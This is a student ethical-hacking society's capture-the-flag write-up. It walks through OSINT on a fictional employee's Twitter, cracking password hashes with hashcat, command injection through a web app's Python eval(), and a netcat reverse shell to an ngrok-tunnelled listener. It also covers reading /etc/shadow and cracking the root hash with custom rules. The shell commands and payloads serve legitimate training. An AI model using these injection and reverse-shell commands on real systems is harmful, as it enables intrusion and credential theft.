@@ -1,0 +1,455 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>Week 1: OSINT Chalange Writeup - CUEH ComSec</title><meta name=Description content="The official site of CUEH ComSec - Coventry University's Ethical Hacking Society. Meeting weekly, we plan to use this site to show the progress of the group."><meta property="og:title" content="Week 1: OSINT Chalange Writeup">
+<meta property="og:description" content="Intro The first-week challenge covers the basics of OSINT research, opening remote connections and password cracking. I will try to cover most of the methods we can use to get through Jack&rsquo;s cat and Ben&rsquo;s secure passwords. Without further ado, let&rsquo;s begin.
+Challenge 1: Web Username The first one was very tricky for me as I am not a cat person and don&rsquo;t enjoy cat pictures&mldr; Anyway, as we go to the landing page, we can see that there are home(1) and login(2) pages and some information(3) about some employees.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://cov-comsec.github.io/posts/week1_writeup/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-09-28T12:40:28+01:00">
+<meta property="article:modified_time" content="2021-09-28T22:02:25+01:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://cov-comsec.github.io/logo.svg">
+<meta name=twitter:title content="Week 1: OSINT Chalange Writeup">
+<meta name=twitter:description content="Intro The first-week challenge covers the basics of OSINT research, opening remote connections and password cracking. I will try to cover most of the methods we can use to get through Jack&rsquo;s cat and Ben&rsquo;s secure passwords. Without further ado, let&rsquo;s begin.
+Challenge 1: Web Username The first one was very tricky for me as I am not a cat person and don&rsquo;t enjoy cat pictures&mldr; Anyway, as we go to the landing page, we can see that there are home(1) and login(2) pages and some information(3) about some employees.">
+<meta name=application-name content="CUEH ComSec">
+<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/week1_writeup/><link rel=prev href=https://cov-comsec.github.io/posts/taster_week1/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Week 1: OSINT Chalange Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/week1_writeup\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"OSINT,  nc, pwncat, metasploit, hashcat, ngrok","wordcount":1063,"url":"https:\/\/cov-comsec.github.io\/posts\/week1_writeup\/","datePublished":"2021-09-28T12:40:28+01:00","dateModified":"2021-09-28T22:02:25+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Nick"},"description":""}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/about/> About </a><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=https://cueh-comsec.ctfd.io/ rel="noopener noreffer" target=_blank> CTFd </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancel
+</a>
+</div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=https://cueh-comsec.ctfd.io/ title rel="noopener noreffer" target=_blank>CTFd</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contents</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Week 1: OSINT Chalange Writeup</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=https://nikelandjelo.github.io title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw"></i>Nick</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2021-22/><i class="far fa-folder fa-fw"></i>Academic Year 2021-22</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-09-28>2021-09-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1063 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+</div><div class="details toc" id=toc-static kept=true>
+<div class="details-summary toc-title">
+<span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#intro>Intro</a></li>
+<li><a href=#challenge-1-web-username>Challenge 1: Web Username</a></li>
+<li><a href=#challenge-2-web-hashed-password>Challenge 2: Web Hashed Password</a></li>
+<li><a href=#challenge-3-what-is-dixsons-password>Challenge 3: What is Dixson&rsquo;s password?</a></li>
+<li><a href=#challenge-4-user-flag>Challenge 4: User Flag</a>
+<ul>
+<li><a href=#on-our-machine>On our machine</a></li>
+<li><a href=#on-the-victims-machine>On the victim&rsquo;s machine</a></li>
+</ul>
+</li>
+<li><a href=#challenge-5-root-flag>Challenge 5: Root Flag</a>
+<ul>
+<li><a href=#hope-you-have-learned-something-new->Hope you have learned something new 😄🐈‍⬛</a></li>
+</ul>
+</li>
+</ul>
+</nav></div>
+</div><div class=content id=content><h2 id=intro>Intro</h2>
+<p>The first-week challenge covers the basics of OSINT research, opening remote connections and password cracking. I will try to cover most of the methods we can use to get through Jack&rsquo;s cat and Ben&rsquo;s secure passwords. Without further ado, let&rsquo;s begin.</p>
+<h2 id=challenge-1-web-username>Challenge 1: Web Username</h2>
+<p>The first one was very tricky for me as I am not a cat person and don&rsquo;t enjoy cat pictures&mldr;
+Anyway, as we go to the landing page, we can see that there are home(1) and login(2) pages and some information(3) about some employees.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=pics/webpage.png data-srcset="/posts/week1_writeup/pics/webpage.png, pics/webpage.png 1.5x, /posts/week1_writeup/pics/webpage.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/webpage.png title="Web Page"></p>
+<p>As the challenge is OSINT related, we can try to find some accounts or any information on the internet related to these people. After a little bit of googling, I managed to find <a href=https://twitter.com/DixsonVarley target=_blank rel="noopener noreffer">Dixon&rsquo;s Twitter account</a>. Following the chronology and the contest of the tweets, we can see that Dixon has started working for Insanity Accounting a while after he created his account. From one of the tweets, we can see a picture of his cat&mldr; and the username we were looking for on peace of paper under the cat&mldr;&mldr;</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=pics/cat.png data-srcset="/posts/week1_writeup/pics/cat.png, pics/cat.png 1.5x, /posts/week1_writeup/pics/cat.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/cat.png title=Username></p>
+<p><code>Flag: D.Varley772</code></p>
+<h2 id=challenge-2-web-hashed-password>Challenge 2: Web Hashed Password</h2>
+<p>The second challenge is more obvious.
+If we take a look over this tweet, we can see that Dixon messed up something and decided to share a link with us.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=pics/tweetP1.png data-srcset="/posts/week1_writeup/pics/tweetP1.png, pics/tweetP1.png 1.5x, /posts/week1_writeup/pics/tweetP1.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/tweetP1.png title=Tweet1></p>
+<p>The <a href=https://twitter.com/DixsonVarley/status/1431255932445417473 target=_blank rel="noopener noreffer">link</a> will take us to deleted tweet, but that doesn&rsquo;t mean we can&rsquo;t see it. By using <a href=https://archive.org/web/ target=_blank rel="noopener noreffer">WayBack</a> we can see the content of the tweet.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=pics/tweetP2.png data-srcset="/posts/week1_writeup/pics/tweetP2.png, pics/tweetP2.png 1.5x, /posts/week1_writeup/pics/tweetP2.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/tweetP2.png title=Tweet2></p>
+<p>And we got our second flag.</p>
+<p><code>Flag: ab353a4eaf482265e7a85cba84422b4ab95fae8a4f5dd2bddea9548d53d1644a</code></p>
+<h2 id=challenge-3-what-is-dixsons-password>Challenge 3: What is Dixson&rsquo;s password?</h2>
+<p>For challenge 3, we are given a new hash as the one from challenge 2 is incorrect.
+To crack the hash we can use either <code>hashcat</code>, <code>johnny</code>, <a href=https://crackstation.net/ target=_blank rel="noopener noreffer">CrackStation</a>, <code>Cain&Abel</code>, etc. As <code>hashcat</code> is the best password brute force tool, in my opinion, I will use it, but CrackStation will do just fine for this password.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>❯ hashid &#39;9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd&#39; -m
+Analyzing &#39;9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd&#39;
+[+] Snefru-256
+[+] SHA-256 [Hashcat Mode: 1400]
+[+] RIPEMD-256
+[+] Haval-256
+[+] GOST R 34.11-94 [Hashcat Mode: 6900]
+[+] GOST CryptoPro S-Box
+[+] SHA3-256 [Hashcat Mode: 5000]
+[+] Skein-256
+[+] Skein-512(256)
+
+❯ hashcat -m 1400 -a 0 &#39;9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd&#39; rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><code>Result: 9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd:qwertyuiop</code>
+<code>Flag: qwertyuiop</code></p>
+<h2 id=challenge-4-user-flag>Challenge 4: User Flag</h2>
+<p>Great! We have credentials.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Username: D.Varley772
+Password: qwertyuiop
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we can try logging in.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=pics/UI.png data-srcset="/posts/week1_writeup/pics/UI.png, pics/UI.png 1.5x, /posts/week1_writeup/pics/UI.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/UI.png title=UI></p>
+<p>Sweet! <code>eval()</code> = free shell.
+By running the following code, we can execute commands on the target machine: <code>eval('__import__("subprocess").getoutput("&lt;COMMAND>")')</code>.
+We can get the flag by running <code>eval('__import__("subprocess").getoutput("cat /home/intern/user.txt")')</code>, but it would be more interesting if we get bind or reverse shell. There are many different ways of opening any of these shells, but as the system has <code>nc</code>, I will go with it.
+So, I will use reverse shell using ngrok to bypass my home router firewall and to keep my public IP private and <code>pwncat</code> for more stable shell.</p>
+<h3 id=on-our-machine>On our machine</h3>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>ngrok tcp 4444
+pwncat -l 0.0.0.0 4444 --self-inject /bin.bash:&lt;NGINX_IP&gt;:&lt;NGINX_PORT&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=on-the-victims-machine>On the victim&rsquo;s machine</h3>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>eval(&#39;__import__(&#34;subprocess&#34;).getoutput(&#34;nc &lt;NGROK_IP&gt; &lt;NGROK_PORT&gt; -e /bin/bash&#34;)&#39;)
+</code></pre></td></tr></table>
+</div>
+</div><p><img class=lazyload src=/svg/loading.min.svg data-src=pics/rev_shell.png data-srcset="/posts/week1_writeup/pics/rev_shell.png, pics/rev_shell.png 1.5x, /posts/week1_writeup/pics/rev_shell.png 2x" data-sizes=auto alt=/posts/week1_writeup/pics/rev_shell.png title="Reverse Shell">
+And voila! We have a shell. Even if the shell gets closed for some reason (internet drops, we press <code>Ctl-C</code> by accident, etc.), the only thing we need to do is to open a new listener (<code>pwncat -l 0.0.0.0 4444</code>), and we will get connected.
+The only thing left is to get the user flag.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>cat /home/intern/user.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><code>Flag: cueh{0h...I_gu3ss_y0u_can_r3vers3_shell_via_3val}</code></p>
+<h2 id=challenge-5-root-flag>Challenge 5: Root Flag</h2>
+<p>Now, on the root flag!
+<br>
+No further enumeration is required than <code>cat /etc/shadow</code>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>root:$6$czitf7EkuZDKvo1G$Fzuxy.As6BxQhNyUV0zq9z0ehkb3yhzSAOFekJ1jpf.J3/3wJ.v.ARwzq28tQp2XEI81tl.hb6bWWY29JLxnX0:18891:0:99999:7:::
+daemon:*:18799:0:99999:7:::
+bin:*:18799:0:99999:7:::
+sys:*:18799:0:99999:7:::
+sync:*:18799:0:99999:7:::
+games:*:18799:0:99999:7:::
+man:*:18799:0:99999:7:::
+lp:*:18799:0:99999:7:::
+mail:*:18799:0:99999:7:::
+news:*:18799:0:99999:7:::
+uucp:*:18799:0:99999:7:::
+proxy:*:18799:0:99999:7:::
+www-data:*:18799:0:99999:7:::
+backup:*:18799:0:99999:7:::
+list:*:18799:0:99999:7:::
+irc:*:18799:0:99999:7:::
+gnats:*:18799:0:99999:7:::
+nobody:*:18799:0:99999:7:::
+_apt:*:18799:0:99999:7:::
+intern:$6$xZ.biffGBU0sIYTq$zR7sXPuF/RgvqHdL/Hx33N0/z34pEb008DZnRUrkz/9rZfkY7Cu/tbObJYm0DnHTkMnwtcN/mELCLTJKz0ua50:18891::::::
+</code></pre></td></tr></table>
+</div>
+</div><p>Great! We have hashed. Now, we can try some brute-forcing. However, this would get us nowhere unless we pay attention to the <code>notes</code> left in the <code>/home/intern/</code> directory.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Efforts to get the boss to give me the credentials for root on this machine haven&#39;t been going well. Luckily I have a pretty good idea of what it could be so I can start guessing it.
+
+Here is what I know
+
+- I know my boss set the password
+- He has a cat called Collin
+- He has a daughter called Holly
+- The password he set for Splunk was h0lly_2001
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we can use this info and hashcat rules to crack the password.
+So, if we already have one password we can use it as a template.
+Let&rsquo;s begin with the names. We can put them into a wordlist.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>❯ cat &lt; EOF &gt; names.list
+&gt; Collin
+&gt; collin
+&gt; Holly
+&gt; holly
+&gt; EOF
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we can use a little bit of hashcat-fu and generate a new wordlist from our names. For this purpose, we can use rules. If you are not familiar with hashcat rules, check out their <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack" target=_blank rel="noopener noreffer">documentation</a>
+The rules I am going to use to generate the new wordlist are pretty much going to replace symbols like &ldquo;s&rdquo; with &ldquo;$&rdquo;, &ldquo;a&rdquo; with &ldquo;4&rdquo;, and so on.
+That is the content of the file I am going to use:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>:
+l
+u
+sa4
+sa@
+sb6
+sc&lt;
+sc{
+se3
+sg9
+si1
+si!
+sl1
+so0
+sq9
+ss5
+ss$
+st7
+st+
+sx%
+sa@sc&lt;se3sl1si1so0ss$
+lsa@sc&lt;se3sl1si1so0ss$
+usa@sC&lt;sE3sL1sI1sO0sS$
+sa@sc&lt;se3sl1so0ss$
+lsa@sc&lt;se3sl1so0ss$
+usa@sC&lt;sE3sL1sO0sS$
+sa@sc&lt;se3si1so0ss$
+lsa@sc&lt;se3si1so0ss$
+usa@sC&lt;sE3sI1sO0sS$
+</code></pre></td></tr></table>
+</div>
+</div><p>The command to generate it is:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>hashcat -r rules names.list --stdout &gt; wordlist.list
+</code></pre></td></tr></table>
+</div>
+</div><p>And once we have generated our new wordlist, we can try brute-forcing the password with a <a href="https://hashcat.net/wiki/doku.php?id=mask_attack" target=_blank rel="noopener noreffer">mask attack</a> that is going to look like this:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>hashcat -m 1800 -a 6 hash.txt wordlist.list ?1?2?3?d?d -1 _- -2 12 -3 90
+</code></pre></td></tr></table>
+</div>
+</div><p>This mask will append <code>-</code> or <code>_</code> to the end of each word with folowing all the ears from <code>1900</code> to <code>2099</code>.
+After less then a second we will have our result.
+<code>Result: $6$czitf7EkuZDKvo1G$Fzuxy.As6BxQhNyUV0zq9z0ehkb3yhzSAOFekJ1jpf.J3/3wJ.v.ARwzq28tQp2XEI81tl.hb6bWWY29JLxnX0:C0ll1n_1989</code>
+Now we just need the root flag.
+Bare in mind that to be able to gain live shell (TTY), you need to run: <code>/usr/bin/script -qc /bin/bash /dev/null</code>.
+From there:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>su root
+cat /root/you_rooted_me.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><code>Flag: cueh{0h...y0u_can_us3_hashcat_rulezz}</code></p>
+<h3 id=hope-you-have-learned-something-new->Hope you have learned something new 😄🐈‍⬛</h3>
+</div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Updated on 2021-09-28&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/338bb8634b9e251153da38d98a72d3fd34d8a87a target=_blank title="commit by Nick(44437104+Nikelandjelo@users.noreply.github.com) 338bb8634b9e251153da38d98a72d3fd34d8a87a: Update content/posts/week1_writeup/index.md">
+<i class="fas fa-hashtag fa-fw"></i>338bb86</a></span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/posts/week1_writeup/index.md target=_blank>Read Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/osint/>OSINT</a>,&nbsp;<a href=/tags/nc/> nc</a>,&nbsp;<a href=/tags/pwncat/>pwncat</a>,&nbsp;<a href=/tags/metasploit/>Metasploit</a>,&nbsp;<a href=/tags/hashcat/>hashcat</a>,&nbsp;<a href=/tags/ngrok/>ngrok</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
+</section>
+</div>
+<div class=post-nav><a href=/posts/taster_week1/ class=prev rel=prev title="Week1: Intro, Recon & OSINT"><i class="fas fa-angle-left fa-fw"></i>Week1: Intro, Recon & OSINT</a></div>
+</div>
+<div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong>
+<noscript>
+Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
+</html>
